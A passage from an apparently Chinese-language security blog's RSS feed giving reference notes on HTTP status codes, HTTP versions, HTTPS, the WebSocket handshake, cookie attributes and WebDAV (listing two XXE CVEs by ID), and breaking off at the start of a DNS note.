&lt;h2 id=&#34;http状态返回代码-3xx-重定向&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http状态返回代码-3xx-重定向&#34;&gt;#&lt;/a&gt; HTTP 状态返回代码 3xx （重定向）&lt;/h2&gt;
&lt;p&gt;表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Code&lt;/th&gt;
&lt;th&gt;代码&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;300&lt;/td&gt;
&lt;td&gt;多种选择&lt;/td&gt;
&lt;td&gt;针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;301&lt;/td&gt;
&lt;td&gt;永久移动&lt;/td&gt;
&lt;td&gt;请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;302&lt;/td&gt;
&lt;td&gt;临时移动&lt;/td&gt;
&lt;td&gt;服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;303&lt;/td&gt;
&lt;td&gt;查看其他位置&lt;/td&gt;
&lt;td&gt;请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;304&lt;/td&gt;
&lt;td&gt;未修改&lt;/td&gt;
&lt;td&gt;自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;305&lt;/td&gt;
&lt;td&gt;使用代理&lt;/td&gt;
&lt;td&gt;请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;307&lt;/td&gt;
&lt;td&gt;临时重定向&lt;/td&gt;
&lt;td&gt;服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;http状态返回代码-4xx请求错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http状态返回代码-4xx请求错误&#34;&gt;#&lt;/a&gt; HTTP 状态返回代码 4xx（请求错误）&lt;/h2&gt;
&lt;p&gt;这些状态代码表示请求可能出错，妨碍了服务器的处理。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Code&lt;/th&gt;
&lt;th&gt;代码&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;400&lt;/td&gt;
&lt;td&gt;错误请求&lt;/td&gt;
&lt;td&gt;服务器不理解请求的语法。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;401&lt;/td&gt;
&lt;td&gt;未授权&lt;/td&gt;
&lt;td&gt;请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;403&lt;/td&gt;
&lt;td&gt;禁止&lt;/td&gt;
&lt;td&gt;服务器拒绝请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;404&lt;/td&gt;
&lt;td&gt;未找到&lt;/td&gt;
&lt;td&gt;服务器找不到请求的网页。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;405&lt;/td&gt;
&lt;td&gt;方法禁用&lt;/td&gt;
&lt;td&gt;禁用请求中指定的方法。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;406&lt;/td&gt;
&lt;td&gt;不接受&lt;/td&gt;
&lt;td&gt;无法使用请求的内容特性响应请求的网页。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;407&lt;/td&gt;
&lt;td&gt;需要代理授权&lt;/td&gt;
&lt;td&gt;此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;408&lt;/td&gt;
&lt;td&gt;请求超时&lt;/td&gt;
&lt;td&gt;服务器等候请求时发生超时。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;409&lt;/td&gt;
&lt;td&gt;冲突&lt;/td&gt;
&lt;td&gt;服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;410&lt;/td&gt;
&lt;td&gt;已删除&lt;/td&gt;
&lt;td&gt;如果请求的资源已永久删除，服务器就会返回此响应。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;411&lt;/td&gt;
&lt;td&gt;需要有效长度&lt;/td&gt;
&lt;td&gt;服务器不接受不含有效内容长度标头字段的请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;412&lt;/td&gt;
&lt;td&gt;未满足前提条件&lt;/td&gt;
&lt;td&gt;服务器未满足请求者在请求中设置的其中一个前提条件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;413&lt;/td&gt;
&lt;td&gt;请求实体过大&lt;/td&gt;
&lt;td&gt;服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;414&lt;/td&gt;
&lt;td&gt;请求的 URI 过长&lt;/td&gt;
&lt;td&gt;请求的 URI（通常为网址）过长，服务器无法处理。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;415&lt;/td&gt;
&lt;td&gt;不支持的媒体类型&lt;/td&gt;
&lt;td&gt;请求的格式不受请求页面的支持。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;416&lt;/td&gt;
&lt;td&gt;请求范围不符合要求&lt;/td&gt;
&lt;td&gt;如果页面无法提供请求的范围，则服务器会返回此状态代码。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;417&lt;/td&gt;
&lt;td&gt;未满足期望值&lt;/td&gt;
&lt;td&gt;服务器未满足 &amp;quot;期望&amp;quot; 请求标头字段的要求。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;http状态返回代码-5xx服务器错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http状态返回代码-5xx服务器错误&#34;&gt;#&lt;/a&gt; HTTP 状态返回代码 5xx（服务器错误）&lt;/h2&gt;
&lt;p&gt;这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Code&lt;/th&gt;
&lt;th&gt;代码&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;500&lt;/td&gt;
&lt;td&gt;服务器内部错误&lt;/td&gt;
&lt;td&gt;服务器遇到错误，无法完成请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;501&lt;/td&gt;
&lt;td&gt;尚未实施&lt;/td&gt;
&lt;td&gt;服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;502&lt;/td&gt;
&lt;td&gt;错误网关&lt;/td&gt;
&lt;td&gt;服务器作为网关或代理，从上游服务器收到无效响应。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;503&lt;/td&gt;
&lt;td&gt;服务不可用&lt;/td&gt;
&lt;td&gt;服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;504&lt;/td&gt;
&lt;td&gt;网关超时&lt;/td&gt;
&lt;td&gt;服务器作为网关或代理，但是没有及时从上游服务器收到请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;505&lt;/td&gt;
&lt;td&gt;HTTP 版本不受支持&lt;/td&gt;
&lt;td&gt;服务器不支持请求中所用的 HTTP 协议版本。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;http-版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-版本&#34;&gt;#&lt;/a&gt; HTTP 版本&lt;/h1&gt;
&lt;h2 id=&#34;http&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http&#34;&gt;#&lt;/a&gt; HTTP&lt;/h2&gt;
&lt;p&gt;HTTP 是基于 TCP/IP 协议的应用层协议，主要规定了客户端和服务器之间的通信格式，默认使用 80 端口。&lt;/p&gt;
&lt;h2 id=&#34;http-09&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-09&#34;&gt;#&lt;/a&gt; HTTP 0.9&lt;/h2&gt;
&lt;p&gt;HTTP 0.9 最早在 1991 年发布，仅支持 GET 命令，请求格式只有简单的  &lt;code&gt;GET /url&lt;/code&gt;  ，服务端仅响应 HTML，响应完毕后关闭 TCP 连接。&lt;/p&gt;
&lt;h2 id=&#34;http-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-10&#34;&gt;#&lt;/a&gt; HTTP 1.0&lt;/h2&gt;
&lt;p&gt;1996 年 5 月，HTTP/1.0 版本发布，丰富了传输的格式和内容，还引入了 POST、HEAD 两个动词。从 1.0 开始，必须在尾部添加协议版本。在 1.0 中，也引入了状态码 (status code)、多字符集支持、多部分发送 (multi-part type)、权限 (authorization)、缓存 (cache)、内容编码 (content encoding) 等内容。&lt;/p&gt;
&lt;p&gt;HTTP 1.0 版的主要缺点是，每个 TCP 连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。&lt;/p&gt;
&lt;p&gt;TCP 连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢 (slow start)，所以，HTTP 1.0 版本的性能比较差。&lt;/p&gt;
&lt;h2 id=&#34;http-11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-11&#34;&gt;#&lt;/a&gt; HTTP 1.1&lt;/h2&gt;
&lt;p&gt;1997 年 1 月，HTTP/1.1 版本发布，进一步完善了 HTTP 协议。1.1 版本主要是引入了持久连接、管道机制、Content-Length、分块传输编码等内容。管道机制即在同一个 TCP 连接里面，客户端可以同时发送多个请求，这样就改进了 HTTP 协议的效率。PUT、PATCH、HEAD、 OPTIONS、DELETE 等动词方法也是在 HTTP 1.1 版本引入的。另外 1.1 版本新增了 Host 字段，用于指定服务器的域名，这也是后来虚拟主机得以发展的基础。&lt;/p&gt;
&lt;p&gt;虽然 1.1 版允许复用 TCP 连接，但是同一个 TCP 连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。如果有一个请求很慢，就会阻塞后面的请求。&lt;/p&gt;
&lt;h2 id=&#34;spdy&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spdy&#34;&gt;#&lt;/a&gt; SPDY&lt;/h2&gt;
&lt;p&gt;2009 年，谷歌公开了自行研发的 SPDY 协议，用于解决 HTTP/1.1 效率不高的问题，而后被当做 HTTP/2 的基础。&lt;/p&gt;
&lt;h2 id=&#34;http2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http2&#34;&gt;#&lt;/a&gt; HTTP/2&lt;/h2&gt;
&lt;p&gt;2015 年，HTTP/2 发布，HTTP/2 是一个二进制协议，头信息和数据体都是二进制，统称为帧 (frame)，帧分为头信息帧和数据帧。HTTP/2 复用 TCP 连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序回应。&lt;/p&gt;
&lt;h1 id=&#34;https&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#https&#34;&gt;#&lt;/a&gt; HTTPS&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;HTTPS (HyperText Transfer Protocol over Secure Socket Layer) 可以理解为 HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL。&lt;/p&gt;
&lt;h2 id=&#34;交互&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交互&#34;&gt;#&lt;/a&gt; 交互&lt;/h2&gt;
&lt;h3 id=&#34;证书验证阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书验证阶段&#34;&gt;#&lt;/a&gt; 证书验证阶段&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;浏览器发起 HTTPS 请求&lt;/li&gt;
&lt;li&gt;服务端返回 HTTPS 证书
&lt;ul&gt;
&lt;li&gt;其中证书包含：
&lt;ul&gt;
&lt;li&gt;颁发机构信息&lt;/li&gt;
&lt;li&gt;公钥&lt;/li&gt;
&lt;li&gt;公司信息&lt;/li&gt;
&lt;li&gt;域名&lt;/li&gt;
&lt;li&gt;有效期&lt;/li&gt;
&lt;li&gt;指纹&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;客户端验证证书是否合法，如果不合法则提示告警&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据传输阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据传输阶段&#34;&gt;#&lt;/a&gt; 数据传输阶段&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;当证书验证合法后，在本地生成随机数&lt;/li&gt;
&lt;li&gt;通过公钥加密随机数，并把加密后的随机数传输到服务端&lt;/li&gt;
&lt;li&gt;服务端通过私钥对随机数进行解密&lt;/li&gt;
&lt;li&gt;服务端通过客户端传入的随机数构造对称加密算法，对返回结果内容进行加密后传输&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ca&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ca&#34;&gt;#&lt;/a&gt; CA&lt;/h2&gt;
&lt;p&gt;CA (Certificate Authority) 是颁发数字证书的机构。是负责发放和管理数字证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。&lt;/p&gt;
&lt;h1 id=&#34;websocket&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#websocket&#34;&gt;#&lt;/a&gt; WebSocket&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;WebSocket 是一种网络传输协议，可在单个 TCP 连接上进行全双工通信，位于 OSI 模型的应用层。WebSocket 协议在 2011 年由 IETF 标准化为 RFC 6455，后由 RFC 7936 补充规范。&lt;/p&gt;
&lt;h2 id=&#34;交互-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交互-2&#34;&gt;#&lt;/a&gt; 交互&lt;/h2&gt;
&lt;h3 id=&#34;握手&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#握手&#34;&gt;#&lt;/a&gt; 握手&lt;/h3&gt;
&lt;p&gt;握手阶段和 HTTP 协议较为类似，RFC 文档中给出的握手示例如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中 Upgrade 的值必须为 websocket ，Connection 的值必须为 Upgrade ，合起来表示客户端喜欢连接升级到 Websocket 协议。&lt;/p&gt;
&lt;p&gt;Sec-WebSocket-Key 是一个随机值，Sec-WebSocket-Accept 是 Sec-WebSocket-Key 拼接特定字符串  &lt;code&gt;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&lt;/code&gt;  计算 SHA1 摘要后的 Base64 编码的值。例子中  &lt;code&gt;s3pPLMBiTxaQ9kYGzzhZRbK+xOo=&lt;/code&gt;  就是  &lt;code&gt;dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11&lt;/code&gt;  对应的 SHA1 摘要。&lt;/p&gt;
&lt;h1 id=&#34;cookie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie&#34;&gt;#&lt;/a&gt; Cookie&lt;/h1&gt;
&lt;h2 id=&#34;2751-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2751-简介&#34;&gt;#&lt;/a&gt; 2.7.5.1. 简介&lt;/h2&gt;
&lt;p&gt;Cookie（复数形态 Cookies），类型为「小型文本文件」，指某些网站为了辨别用户身份而储存在用户本地终端上的数据。&lt;/p&gt;
&lt;h2 id=&#34;2752-属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2752-属性&#34;&gt;#&lt;/a&gt; 2.7.5.2. 属性&lt;/h2&gt;
&lt;h3 id=&#34;name&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#name&#34;&gt;#&lt;/a&gt; name&lt;/h3&gt;
&lt;p&gt;cookie 的名称。&lt;/p&gt;
&lt;h3 id=&#34;value&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#value&#34;&gt;#&lt;/a&gt; value&lt;/h3&gt;
&lt;p&gt;cookie 的值。&lt;/p&gt;
&lt;h3 id=&#34;expires&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#expires&#34;&gt;#&lt;/a&gt; expires&lt;/h3&gt;
&lt;p&gt;当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。&lt;/p&gt;
&lt;h3 id=&#34;max-age&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#max-age&#34;&gt;#&lt;/a&gt; max-age&lt;/h3&gt;
&lt;p&gt;max-age 可以为正数、负数、0。如果 max-age 属性为正数时，浏览器会将其持久化，当 max-age 属性为负数，则表示该 Cookie 只是一个会话性 Cookie。当 max-age 为 0 时，则会立即删除这个 Cookie。Expires 和 max-age 都存在的条件下，max-age 优先级更高。&lt;/p&gt;
&lt;h3 id=&#34;domain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domain&#34;&gt;#&lt;/a&gt; domain&lt;/h3&gt;
&lt;p&gt;指定 Cookie 的域名，默认是当前域名。domain 设置时可以设置为自身及其父域，子域可以访问父域的 Cookie，反之不能。&lt;/p&gt;
&lt;h3 id=&#34;path&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#path&#34;&gt;#&lt;/a&gt; path&lt;/h3&gt;
&lt;p&gt;指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送对应的 Cookie。&lt;/p&gt;
&lt;h3 id=&#34;secure&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#secure&#34;&gt;#&lt;/a&gt; secure&lt;/h3&gt;
&lt;p&gt;只能通过 HTTPS 传输。&lt;/p&gt;
&lt;h3 id=&#34;httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; httponly&lt;/h3&gt;
&lt;p&gt;限制 Cookie 仅在 HTTP 传输过程中被读取，一定程度上防御 XSS 攻击。&lt;/p&gt;
&lt;h3 id=&#34;samesite&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#samesite&#34;&gt;#&lt;/a&gt; SameSite&lt;/h3&gt;
&lt;p&gt;SameSite 支持 Strict / Lax / None 三种值。Strict 最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。Lax 允许部分第三方请求携带 Cookie，主要是链接、预加载、GET 表单三种情况。Cookie 的 SameSite 属性为 None ，且设置了 Secure 时，无论是否跨站都会发送 Cookie。&lt;/p&gt;
&lt;h1 id=&#34;webdav&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webdav&#34;&gt;#&lt;/a&gt; WebDAV&lt;/h1&gt;
&lt;h2 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1 协议的通信协议。它扩展了 HTTP 1.1，在 GET、POST、HEAD 等几个 HTTP 标准方法以外添加了一些新的方法，使应用程序可对 Web Server 直接读写，并支持写文件锁定、解锁，以及版本控制等功能。&lt;/p&gt;
&lt;p&gt;支持的方法具体为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OPTIONS
&lt;ul&gt;
&lt;li&gt;获取服务器的支持&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GET / PUT / POST / DELETE
&lt;ul&gt;
&lt;li&gt;资源操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TRACE
&lt;ul&gt;
&lt;li&gt;跟踪服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HEAD&lt;/li&gt;
&lt;li&gt;MKCOL
&lt;ul&gt;
&lt;li&gt;创建集合&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PROPFIND / PROPPATCH&lt;/li&gt;
&lt;li&gt;COPY / MOVE&lt;/li&gt;
&lt;li&gt;LOCK / UNLOCK&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;相关cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2015-1833
&lt;ul&gt;
&lt;li&gt;Apache Jacrabbit WebDav XXE&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9hcmNoaXZlLzEvNTM1NTgy&#34;&gt;http://www.securityfocus.com/archive/1/535582&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2015-7326
&lt;ul&gt;
&lt;li&gt;Milton WebDav XXE&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9hcmNoaXZlLzEvNTM2ODEz&#34;&gt;http://www.securityfocus.com/archive/1/536813&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzMyNTM=&#34;&gt;RFC 3253&lt;/span&gt; Versioning Extensions to WebDAV (Web Distributed Authoring and Versioning)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM2NDg=&#34;&gt;RFC 3648&lt;/span&gt; Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM3NDQ=&#34;&gt;RFC 3744&lt;/span&gt; Web Distributed Authoring and Versioning (WebDAV) Access Control Protocol&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ0Mzc=&#34;&gt;RFC 4437&lt;/span&gt; Web Distributed Authoring and Versioning (WebDAV) Redirect Reference Resources&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ5MTg=&#34;&gt;RFC 4918&lt;/span&gt; HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjM=&#34;&gt;RFC 5323&lt;/span&gt; Web Distributed Authoring and Versioning (WebDAV) SEARCH&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzU4NDI=&#34;&gt;RFC 5842&lt;/span&gt; Binding Extensions to Web Distributed Authoring and Versioning (WebDAV)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kYXRhdHJhY2tlci5pZXRmLm9yZy9kb2MvaHRtbC9yZmM2NDU1&#34;&gt;The WebSocket Protocol&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kYXRhdHJhY2tlci5pZXRmLm9yZy9kb2MvaHRtbC9yZmM3OTM2&#34;&gt;Clarifying Registry Procedures for the WebSocket Subprotocol Name Registry&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;blog&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blog&#34;&gt;#&lt;/a&gt; Blog&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzIwMTUuemVyb25pZ2h0cy5vcmcvYXNzZXRzL2ZpbGVzLzM1LUVnb3Jvdi5wZGY=&#34;&gt;What should a hacker know about WebDav&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTkvMDkvY29va2llLXNhbWVzaXRlLmh0bWw=&#34;&gt;Cookie 的 SameSite 属性&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTYvMDgvaHR0cC5odG1s&#34;&gt;HTTP 协议入门&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/DNS/</guid>
            <title>域名系统</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/DNS/</link>
            <category>域名</category>
            <category>DNS</category>
            <category>WEB</category>
            <pubDate>Fri, 25 Nov 2022 10:06:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;DNS 是一个简单的请求 - 响应协议，是将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS 使用 TCP 和 UDP 协议的 53 端口。&lt;/p&gt;
&lt;h1 id=&#34;请求响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求响应&#34;&gt;#&lt;/a&gt; 请求响应&lt;/h1&gt;
&lt;h2 id=&#34;dns记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns记录&#34;&gt;#&lt;/a&gt; DNS 记录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回域名对应的 IPv4 地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AAAA&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NS&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;域名服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;返回该域名由哪台域名服务器解析&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PTR&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反向记录&lt;/li&gt;
&lt;li&gt;从 IP 地址到域名的记录&lt;/li&gt;
&lt;/ul&gt;
